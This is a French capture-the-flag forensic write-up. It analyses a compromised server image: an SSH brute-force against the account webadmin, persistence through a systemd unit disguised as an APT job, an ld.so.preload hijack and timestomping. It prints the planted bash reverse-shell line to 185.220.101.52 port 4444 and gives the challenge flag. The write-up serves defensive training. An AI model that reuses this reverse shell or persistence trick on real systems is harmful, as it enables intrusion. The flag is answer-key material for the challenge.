# Writeup — serveur-compromis

**Catégorie :** forensic · **Niveau :** avancé
**Flag :** `FPS{webadmin_apt-daily-cleanup_4444}`

Aucun flag n'est stocké : il se **reconstruit** à partir de 3 constats.
Lecture de l'image sans montage : `debugfs -R "cat <chemin>" serveur.img`,
Sleuth Kit (`fls`, `icat`, `istat`), ou montage loop en lecture seule.

## 1. Compte compromis — `auth.log`

```
debugfs -R "cat /var/log/auth.log" serveur.img | grep -E "Failed|Accepted"
```
Des centaines de `Failed password ... from 185.220.101.52` (brute-force),
puis :
```
Accepted password for webadmin from 185.220.101.52 ...
```
→ compte = **webadmin**. (Rotations `auth.log.1`, `auth.log.2.gz` présentes.)

## 2. Persistance — timer/service systemd déguisé

Dans `/etc/systemd/system/` figure `apt-daily-cleanup.{timer,service}` — un
**imposteur** (les vraies unités APT sont `apt-daily` et `apt-daily-upgrade`).
Le service :
```
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/185.220.101.52/4444 0>&1'
```
→ unité = **apt-daily-cleanup**, port C2 = **4444**.

## 3. Flag

```
FPS{webadmin_apt-daily-cleanup_4444}
```

## Pistes d'analyse complémentaires (réalisme)

- `/etc/ld.so.preload` → `/usr/lib/.cache/libncurse.so` (hijack de chargement).
- **Timestompage** : `istat` sur ce `.so` montre `mtime/atime/ctime = 2025-01-03`
  mais **`crtime = 2026-09-15`**. Une date de création *postérieure* à la date
  de modification est impossible normalement → artefact anti-forensic.
- `/home/webadmin/.bash_history` **vidé** (anti-forensic).
- `/var/tmp/.cache/x.enc` : **archive chiffrée**, non déchiffrable ici — la clé
  n'existe qu'en mémoire vive. → Suite dans le défi **memoire-vive** .

```
python3 solve.py          # reconstruit le flag + prouve le timestomp
```

## Remédiation

- Durcir SSH (clés, fail2ban, pas de mot de passe), surveiller les unités
  systemd et `ld.so.preload`.
- Collecter `crtime` (les attaquants oublient souvent de le falsifier).

*(`gen.py` reconstruit l'image ; `shared_secret.py` (dossier memoire-vive) définit
la clé de `x.enc`, partagée avec memoire-vive.)*
